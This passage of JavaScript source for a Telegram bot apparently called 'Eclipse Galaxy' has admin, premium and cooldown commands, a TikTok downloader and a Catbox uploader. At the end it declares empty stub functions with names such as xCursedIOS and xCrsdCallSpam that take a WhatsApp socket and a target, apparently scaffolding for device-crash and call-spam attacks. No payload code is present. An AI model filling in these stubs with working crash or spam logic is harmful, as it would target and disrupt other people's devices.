        parse_mode: "Markdown"
      }
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `✅ User ${userId} has been added as an admin.`,
        parse_mode: "Markdown"
      }
    );
  } else {
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `❌ User ${userId} is already an admin.`,
        parse_mode: "Markdown"
      }
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ You are not authorized to remove premium users.",
        parse_mode: "Markdown"
      }
    );
  }

  if (!match[1]) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Please provide a user ID. Example: /delprem 6843967527",
        parse_mode: "Markdown"
      }
    );
  }

  const userId = parseInt(match[1]);

  if (isNaN(userId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Invalid input. User ID must be a number.",
        parse_mode: "Markdown"
      }
    );
  }

  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `❌ User ${userId} is not in the premium list.`,
        parse_mode: "Markdown"
      }
    );
  }

  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendPhoto(
    chatId,
    menuImages.owner,
    {
      caption: `✅ User ${userId} has been removed from the premium list.`,
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        parse_mode: "Markdown"
      }
    );
  }

  if (!match || !match[1]) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.",
        parse_mode: "Markdown"
      }
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Invalid input. Example: /deladmin 6843967527.",
        parse_mode: "Markdown"
      }
    );
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `✅ User ${userId} has been removed from admin.`,
        parse_mode: "Markdown"
      }
    );
  } else {
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `❌ User ${userId} is not an admin.`,
        parse_mode: "Markdown"
      }
    );
  }
});

bot.onText(/\/setcd (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "⚠ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        parse_mode: "Markdown"
      }
    );
  }

  const duration = parseDuration(input);

  if (!duration) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Format salah!\nContoh: /setcd 10s | 5m | 1h",
        parse_mode: "Markdown"
      }
    );
  }

  cooldownDuration = duration;

  bot.sendPhoto(
    chatId,
    menuImages.owner,
    {
      caption: `✅ Cooldown diset ke ${input}`,
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/^\/resetcd$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  try {
  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "⚠ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        parse_mode: "Markdown"
      }
    );
  }
  cooldownDuration = 0;
  userCooldown.clear();
  

  bot.sendPhoto(
    chatId,
    menuImages.owner,
    {
      caption: "♻️ Cooldown berhasil direset!",
      parse_mode: "Markdown"
    }
  );
  } catch (error) {
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `error goblok!: ${error.message}`,
        parse_mode: "Markdown"
      }
    );
  }
});

//=======( TOOLS )=======\\

bot.onText(/^\/tiktokdl (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  await bot.sendMessage(chatId, "📥 Tunggu bentar bre, lagi download video TikTok-nya...");

  try {
    const api = `https://api.nekolabs.web.id/downloader/tiktok?url=${encodeURIComponent(url)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal ambil data dari API NekoLabs bre.");
    }

    const result = data.result;

    const caption =
      `*TikTok Downloader*\n\n` +
      `*Author: ${result.author.name}* (${result.author.username})\n` +
      `*Music: ${result.music_info.title}* - ${result.music_info.author}\n` +
      `Like: ${result.stats.like}  💬 ${result.stats.comment}  🔁 ${result.stats.share}\n` +
      `Date: ${result.create_at}`;

    await bot.sendVideo(chatId, result.videoUrl, {
      caption,
      parse_mode: "Markdown",
    });
    
    await bot.sendAudio(chatId, result.musicUrl, {
      filename: `${result.music_info.title}.mp3`,
      caption: `🎵 ${result.music_info.title} - ${result.music_info.author}`,
      parse_mode: "Markdown",
    });

  } catch (err) {
    console.error("TIKTOK ERROR:", err.message);
    bot.sendMessage(chatId, "❌ Gagal ambil data TikTok bre, coba lagi nanti.");
  }
});

async function uploadToCatbox(fileUrl) {
  const params = new URLSearchParams();
  params.append("reqtype", "urlupload");
  params.append("url", fileUrl);

  const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
    headers: { "content-type": "application/x-www-form-urlencoded" },
    timeout: 30000,
  });

  return data;
}

bot.onText(/\/convert/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const replyMsg = msg.reply_to_message;

  if (!replyMsg) {
    return bot.sendPhoto(chatId, menuImages.tools, {
      caption: "🪧 ☇ Format: /convert (reply dengan foto atau video)",
      parse_mode: "Markdown"
    });
  }

  let fileId = null;
  if (replyMsg.photo && replyMsg.photo.length) {
    fileId = replyMsg.photo[replyMsg.photo.length - 1].file_id;
  } else if (replyMsg.video) {
    fileId = replyMsg.video.file_id;
  } else if (replyMsg.video_note) {
    fileId = replyMsg.video_note.file_id;
  } else {
    return bot.sendPhoto(chatId, menuImages.tools, {
      caption: "❌ ☇ Hanya mendukung foto atau video",
      parse_mode: "Markdown"
    });
  }

  const waitMsg = await bot.sendPhoto(chatId, menuImages.tools, {
    caption: "⏳ ☇ Mengambil file & mengunggah ke Catbox...",
    parse_mode: "Markdown"
  });

  try {
    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    const uploadedUrl = await uploadToCatbox(fileLink);

    if (typeof uploadedUrl === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(uploadedUrl.trim())) {
      await bot.sendMessage(chatId, uploadedUrl.trim());
    } else {
      await bot.sendPhoto(chatId, menuImages.tools, {
        caption: "❌ ☇ Gagal upload ke Catbox.\n" + String(uploadedUrl).slice(0, 200),
        parse_mode: "Markdown"
      });
    }
  } catch (e) {
    const msgError = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke Catbox`
      : "❌ ☇ Gagal unggah, coba lagi.";
    await bot.sendPhoto(chatId, menuImages.tools, {
      caption: msgError,
      parse_mode: "Markdown"
    });
  } finally {
    try {
      await bot.deleteMessage(chatId, waitMsg.message_id);
    } catch {}
  }
});

// ========== FUNGSI BUG YANG BELUM DIDEKLARASIKAN ==========
async function xCursedPrivate1(sock, jid) {
  console.log(`xCursedPrivate1 ke ${jid}`);
  // Isi dengan logic asli
}

async function xCursedUi(sock, jid) {
  console.log(`xCursedUi ke ${jid}`);
}

async function xCrsdCallSpam(sock, jid) {
  console.log(`xCrsdCallSpam ke ${jid}`);
}

async function xCursedCrott(sock, jid) {
  console.log(`xCursedCrott ke ${jid}`);
}

async function xCursedCrawl(sock, jid) {
  console.log(`xCursedCrawl ke ${jid}`);
}

async function xCursedDelayOneHit(sock, jid) {
  console.log(`xCursedDelayOneHit ke ${jid}`);
}

async function xCursedIOS(sock, jid) {
  console.log(`xCursedIOS ke ${jid}`);
}

async function xCursedIOSX(sock, jid) {
  console.log(`xCursedIOSX ke ${jid}`);
}

async function xCursedFzIos(sock, jid) {
  console.log(`xCursedFzIos ke ${jid}`);
}

// Load auto update config saat start
loadAutoUpdateConfig();

// ========== JALANKAN BOT ==========
console.log("Eclipse Galaxy is running...");
